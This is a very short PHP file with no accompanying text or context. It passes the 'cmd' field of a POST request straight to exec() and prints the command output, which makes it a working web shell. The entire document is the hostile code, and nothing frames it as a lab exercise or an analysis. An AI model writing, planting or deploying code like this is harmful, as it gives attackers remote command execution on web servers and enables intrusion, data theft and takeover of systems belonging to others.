<?php
	exec($_POST["cmd"], $S);
	foreach($S as $O)echo $O."^[nl]_";
?>
